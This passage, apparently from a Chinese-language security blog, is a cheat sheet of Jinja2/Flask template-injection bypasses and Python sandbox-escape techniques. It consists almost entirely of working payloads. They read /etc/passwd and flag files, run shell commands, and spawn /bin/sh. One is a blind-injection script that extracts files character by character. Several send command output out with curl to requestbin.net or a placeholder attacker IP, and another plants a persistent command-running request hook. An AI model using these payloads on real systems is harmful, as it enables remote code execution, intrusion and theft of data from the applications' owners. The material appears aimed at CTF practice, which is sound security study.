%&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba=five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %&#125;</span><br><span class="line">&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set space=chcr(three*three*five-five-five-three) %&#125;</span><br><span class="line">&#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h4><p>调用方法来获取属性</p>
<p>列表方法<br>__getitem__<br>pop<br>get<br>setdefault</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict.__getitem__(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.pop(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.get(&#x27;__builtins__&#x27;)</span><br><span class="line">dict.setdefault(&#x27;__builtins__&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(139).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;__import__&#x27;)(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__.pop(1).__subclasses__().pop(139).__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;__import__&#x27;)(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>unicode字符：［］，﹇﹈</p>
<p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br>在这里使用pop并不会真的移除，但却能返回其值，取代中括号，来实现绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)(&quot;cat /flag&quot;,shell=True,stdout=-1).communicate().__getitem__(0)</span><br></pre></td></tr></table></figure>

<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p>request<br>request.args和request.values</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(request.args.v1).popen(request.values.v2).read()&#125;&#125;&amp;v1=os&amp;v2=whoami</span><br></pre></td></tr></table></figure>

<p>chr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>unicode字符：＂＂，＇＇</p>
<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤."></a>过滤.</h4><p>点等价于__getattribute__</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__getattribute__(&#x27;__class__&#x27;)</span><br></pre></td></tr></table></figure>

<p>[]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][1][&#x27;__subclasses__&#x27;]()[139][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](request.args.v1)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>|attr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(139)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;eval&#x27;)(&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>getattr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(&#x27;&#x27;,&#x27;__class__&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤_"></a>过滤_</h4><p>过滤了_可以用dir(0)[0][0]或者request[‘args’]或者 request[‘values’]绕过</p>
<p>request</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.v1][request.args.v2][1][request.args.v3]()[139][request.args.v4][request.args.v5][request.args.v6][request.args.v7](request.args.v8)&#125;&#125;&amp;v1=__class__&amp;v2=__mro__&amp;v3=__subclasses__&amp;v4=__init__&amp;v5=__globals__&amp;v6=__builtins__&amp;v7=eval&amp;v8=__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()</span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)&#125;&#125;&amp;x=__class__&amp;y=__base__&amp;z=__getitem__&amp;a=__subclasses__&amp;b=__init__&amp;c=__globals__&amp;d=__builtins__&amp;e=__import__&amp;f=os&amp;g=__dict__&amp;h=system&amp;i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag`</span><br></pre></td></tr></table></figure>

<h4 id="过滤大括号"><a href="#过滤大括号" class="headerlink" title="过滤大括号"></a>过滤大括号</h4><p>if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxx.xxx.xxx.xxx:12345/?i=`whoami`&quot;).read()&#x27;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>print</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;)) %&#125;</span><br></pre></td></tr></table></figure>

<p>unicode字符：︷︷︸︸</p>
<h4 id="过滤-3"><a href="#过滤-3" class="headerlink" title="过滤()"></a>过滤()</h4><p>unicode字符：⁽⁾，₍₎</p>
<p>对函数执行方式重载，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.__class__.__getitem__=__builtins__.exec</span><br></pre></td></tr></table></figure>
<p>执行request[payload]时相当于exec(payload)</p>
<p>lambda表达式</p>
<h4 id="过滤数字"><a href="#过滤数字" class="headerlink" title="过滤数字"></a>过滤数字</h4><p>unicode字符：𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗，𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡，０１２３４５６７８９</p>
<h4 id="对象层面"><a href="#对象层面" class="headerlink" title="对象层面"></a>对象层面</h4><p>(1)set {}&#x3D;None<br>其他引用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;% set config=None %&#125;&#125; =&gt; &#123;&#123;url_for.__globals__.current_app.config&#125;&#125;</span><br><span class="line">&#123;&#123;% set __builtins__=None %&#125;&#125; =&gt; &#123;&#123;[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == &#x27;catch_warnings&#x27;][0]()._module.__builtins__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>(2)del<br>重载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload(__builtins__)</span><br></pre></td></tr></table></figure>
<p>(3)其它<br>获得对应函数的上下文常量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.__code__.co_consts</span><br></pre></td></tr></table></figure>

<h4 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[request.args.a]&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os[request.args.a]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Jinja 模板中存在 set 语句，用来设置模板中的变量：<br>config 对象实质上是一个字典的子类，可以像字典一样操作。因此要更新字典，我们可以使用 Python 中字典的 update() 方法。用 update() 方法 + 关键字参数更新字典。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;%set x=config.update(l=lipsum)%&#125;</span><br><span class="line">&#123;%set x=config.update(u=config.update)%&#125;</span><br><span class="line">&#123;%set x=config.u(g=request.args.a)%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%set x=config.u(o=lipsum[config.g].os)%&#125;</span><br><span class="line">&#123;%set x=config.u(f=config.l[config.g])%&#125;</span><br><span class="line">&#123;&#123;config.f.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%set x=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%set x=config.a(o=config.f.os)%&#125; </span><br><span class="line">&#123;%set x=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(&quot;cat /t*&quot;).read()&#125;&#125; </span><br><span class="line"></span><br><span class="line">&#123;%set x=config.update(l=lipsum)%&#125;</span><br><span class="line">&#123;%set x=config.update(g=request.args.a)%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%set x=config.update(f=config.l|attr(config.g))%&#125;</span><br><span class="line">&#123;%set x=config.update(o=config.f.os)%&#125;</span><br><span class="line">&#123;%set x=config.update(p=config.o.popen)%&#125;</span><br><span class="line">&#123;%print(config.p(request.args.c).read())%&#125;&amp;c=whoami</span><br></pre></td></tr></table></figure>

<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;yyy.__init__.__globals__.__builtins__|attr(&#x27;__getitem_&#x27;)(&#x27;eval&#x27;)(&#x27;__import__(&quot;time&quot;).sleep(3) if open(&quot;/app/flag.txt&quot;).read()[0]==&quot;f&quot; else 1&#x27;)&#125;&#125;</span><br><span class="line">&#123;%if session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;</span><br><span class="line">&#123;%include session.update(&#123;&#x27;f&#x27;:lipsum.__globals__.__os__.__popen__(&#x27;id&#x27;).read()&#125;)%&#125;</span><br></pre></td></tr></table></figure>

<h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set gl=&#x27;_&#x27;*2+&#x27;globals&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set bu=&#x27;_&#x27;*2+&#x27;builtins&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set im=&#x27;_&#x27;*2+&#x27;i&#x27;&#x27;mport&#x27;+&#x27;_&#x27;*2%&#125;&#123;%set ay=&#x27;so&#x27;[::-1]%&#125;&#123;&#123;cycler.next[gl][bu][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;_&quot;+&quot;_imp&quot;+&quot;ort_&quot;+&quot;_(&#x27;s&quot;+&quot;ys&#x27;).modules[&#x27;_&quot;+&quot;_main_&quot;+&quot;_&#x27;]._&quot;+&quot;_dict_&quot;+&quot;_[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda:&#x27;&lt;pre&gt;&#123;0&#125;&lt;/pre&gt;&#x27;.format(_&quot;+&quot;_impo&quot;+&quot;rt_&quot;+&quot;_(&#x27;o&quot;+&quot;s&#x27;).po&quot;+&quot;pen(&#x27;id&#x27;).read()))&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from string import printable as pt</span><br><span class="line"></span><br><span class="line">host = &#x27;&#x27;</span><br><span class="line">res  = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for c in pt:</span><br><span class="line">        payload = &#x27;&#123;&#123;(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__[&quot;__builtins__&quot;][&quot;file&quot;](&quot;/etc/passwd&quot;).read()|string).index(&quot;%c&quot;,%d,%d)&#125;&#125;&#x27; % (c,i,i+1) </span><br><span class="line">        param = &#123;</span><br><span class="line">            &quot;name&quot;:payload</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.get(host,params=param)</span><br><span class="line"></span><br><span class="line">        if req.status_code == 200:</span><br><span class="line">            res += c</span><br><span class="line">            break</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure>

<h1 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h1><h2 id="逃逸目标"><a href="#逃逸目标" class="headerlink" title="逃逸目标"></a>逃逸目标</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>import</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from os import system as __getattr__; from __main__ import sh</span><br></pre></td></tr></table></figure>

<p>os<br>os.system<br>os.popen<br>os.posix_spawn<br>os.exec*<br>os.spawnv</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"># 执行shell命令不会返回shell的输出</span><br><span class="line">os.system(&#x27;whoami&#x27;)</span><br><span class="line"># 会产生返回值，可通过read()的方式读取返回值</span><br><span class="line">os.popen(&quot;whoami&quot;).read()</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line">os.posix_spawn(&quot;/bin/ls&quot;, [&quot;/bin/ls&quot;, &quot;-l&quot;], os.environ)</span><br><span class="line">os.posix_spawn(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;], os.environ)</span><br><span class="line">os.spawnv(0,&quot;/bin/ls&quot;, [&quot;/bin/ls&quot;, &quot;-l&quot;])</span><br></pre></td></tr></table></figure>

<p>os.exec*()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"># os.execl</span><br><span class="line">os.execl(&#x27;/bin/sh&#x27;, &#x27;xx&#x27;)</span><br><span class="line">__import__(&#x27;os&#x27;).execl(&#x27;/bin/sh&#x27;, &#x27;xx&#x27;)</span><br><span class="line"></span><br><span class="line"># os.execle</span><br><span class="line">os.execle(&#x27;/bin/sh&#x27;, &#x27;xx&#x27;, os.environ)</span><br><span class="line">__import__(&#x27;os&#x27;).execle(&#x27;/bin/sh&#x27;, &#x27;xx&#x27;, __import__(&#x27;os&#x27;).environ)</span><br><span class="line"></span><br><span class="line"># os.execlp</span><br><span class="line">os.execlp(&#x27;sh&#x27;, &#x27;xx&#x27;)</span><br><span class="line">__import__(&#x27;os&#x27;).execle(&#x27;/bin/sh&#x27;, &#x27;xx&#x27;, __import__(&#x27;os&#x27;).environ)</span><br><span class="line"></span><br><span class="line"># os.execlpe</span><br><span class="line">os.execlpe(&#x27;sh&#x27;, &#x27;xx&#x27;, os.environ)</span><br><span class="line">__import__(&#x27;os&#x27;).execlpe(&#x27;sh&#x27;, &#x27;xx&#x27;, __import__(&#x27;os&#x27;).environ)</span><br><span class="line"></span><br><span class="line"># os.execv</span><br><span class="line">os.execv(&#x27;/bin/sh&#x27;, [&#x27;xx&#x27;])</span><br><span class="line">__import__(&#x27;os&#x27;).execv(&#x27;/bin/sh&#x27;, [&#x27;xx&#x27;])</span><br><span class="line"></span><br><span class="line"># os.execve</span><br><span class="line">os.execve(&#x27;/bin/sh&#x27;, [&#x27;xx&#x27;], os.environ)</span><br><span class="line">__import__(&#x27;os&#x27;).execve(&#x27;/bin/sh&#x27;, [&#x27;xx&#x27;], __import__(&#x27;os&#x27;).environ)</span><br><span class="line"></span><br><span class="line"># os.execvp</span><br><span class="line">os.execvp(&#x27;sh&#x27;, [&#x27;xx&#x27;])</span><br><span class="line">__import__(&#x27;os&#x27;).execvp(&#x27;sh&#x27;, [&#x27;xx&#x27;])</span><br><span class="line"></span><br><span class="line"># os.execvpe</span><br><span class="line">os.execvpe(&#x27;sh&#x27;, [&#x27;xx&#x27;], os.environ)</span><br><span class="line">__import__(&#x27;os&#x27;).execvpe(&#x27;sh&#x27;, [&#x27;xx&#x27;], __import__(&#x27;os&#x27;).environ)</span><br></pre></td></tr></table></figure>

<p>os.fork() with os.exec*()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(__import__(&#x27;os&#x27;).fork() == 0) and __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<p>commands</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">commands.getstatusoutput(&quot;ls&quot;)</span><br><span class="line">commands.getoutput(&quot;ls&quot;)</span><br><span class="line">commands.getstatus(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<p>ctypes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(None)</span><br><span class="line">libc.system(&#x27;ls ./&#x27;.encode())  # 使用 encode() 方法将字符串转换为字节字符串</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line">ctypes.CDLL(None).system(&#x27;ls /&#x27;.encode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;ctypes&#x27;).CDLL(None).system(&#x27;ls /&#x27;.encode())</span><br></pre></td></tr></table></figure>

<p>threading</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    os.system(&#x27;ls&#x27;)  # 在新的线程中执行命令</span><br><span class="line"></span><br><span class="line">t = threading.Thread(target=func)  # 创建一个新的线程</span><br><span class="line">t.start()  # 开始执行新的线程</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">写成一行</span><br><span class="line"># eval, exec 都可以执行的版本</span><br><span class="line">__import__(&#x27;threading&#x27;).Thread(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)).start() </span><br><span class="line"></span><br><span class="line"># exec 可执行</span><br><span class="line">import threading, os; threading.Thread(target=lambda: os.system(&#x27;ls&#x27;)).start()</span><br></pre></td></tr></table></figure>

<p>subprocess</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.Popen(&#x27;ls&#x27;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"># python2</span><br><span class="line">subprocess.call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_output(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.Popen(&#x27;whoami&#x27;, shell=True)</span><br><span class="line"></span><br><span class="line"># python3</span><br><span class="line">subprocess.run(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.getoutput(&#x27;whoami&#x27;)</span><br><span class="line">subprocess.getstatusoutput(&#x27;whoami&#x27;)</span><br><span class="line">subprocess.call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_call(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.check_output(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">subprocess.Popen(&#x27;whoami&#x27;, shell=True)</span><br><span class="line">__import__(&#x27;subprocess&#x27;).Popen(&#x27;whoami&#x27;, shell=True)</span><br></pre></td></tr></table></figure>

<p>multiprocessing</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def func():</span><br><span class="line">    os.system(&#x27;ls&#x27;) </span><br><span class="line"></span><br><span class="line">p = multiprocessing.Process(target=func) </span><br><span class="line">p.start()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">multiprocessing.Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;curl localhost:9999/?a=`whoami`&#x27;)).start()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;multiprocessing&#x27;).Process(target=lambda: __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)).start()</span><br></pre></td></tr></table></figure>

<p>_posixsubprocess</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)</span><br><span class="line"></span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>

<p>pty<br>仅限linux环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;ls&quot;)</span><br><span class="line">__import__(&#x27;pty&#x27;).spawn(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<p>timeit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;,number=1)</span><br></pre></td></tr></table></figure>

<p>exec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span><br></pre></td></tr></table></figure>

<p>eval</p>
